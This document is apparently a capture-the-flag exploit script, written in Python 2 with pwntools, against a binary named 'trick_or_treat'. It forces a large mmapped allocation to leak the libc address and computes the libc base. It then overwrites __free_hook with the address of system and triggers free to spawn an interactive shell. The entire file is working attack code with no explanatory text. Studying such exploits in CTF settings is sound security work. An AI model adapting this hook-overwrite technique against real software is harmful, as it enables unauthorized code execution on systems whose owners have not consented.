from pwn import *
import sys, os

log.info("For remote: %s HOST PORT" % sys.argv[0])
bin_name = "./trick_or_treat"

try:
  r = remote(sys.argv[1], int(sys.argv[2]))
except:
  r = process(bin_name) #, env = {})


def do_debug (cmd = ""):
  try:
    if sys.argv[1] == 'debug':
      gdb.attach (r, cmd)
  except:
    pass

elf = ELF (bin_name);
context.word_size = elf.elfclass

libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc

context.terminal = ["tmux", "splitw", "-h"]
#context.log_level = 'debug'

def rr ():
  r.recvuntil (": ")

def menu (idx):
  rr ()
  r.sendline (str(idx))

r.recvuntil ("Size:")
r.sendline (str (2**21 ))

r.recvuntil (":")
libc_leak = int(r.recvline ()[:-1], 16) & 0xfffffffff000

libc_base = libc_leak + 0x201000
print "libc_leak: " + hex(libc_leak)
print "libc_base: " + hex(libc_base)

cmd = """
b free
b malloc
b memmove
b strnlen
b wcschr
b realloc
b strncasecmp_l
b strchrnul
b system
b memcmp
c
"""
do_debug (cmd)
system = libc_base + libc.symbols["system"]
target = libc_base + 0x03EB180- 0x10
target = libc_base + libc.symbols["__free_hook"] - 0x10
print "target: " + hex(target)
offset = (target - libc_leak) / 8

r.recvuntil (":")
r.sendline ("{} {}".format(hex(offset), hex(system)))
r.sendline ("a"*0x8000 + "cccccccc")
r.sendline ("       ed")
r.sendline ("!sh")
r.interactive ()
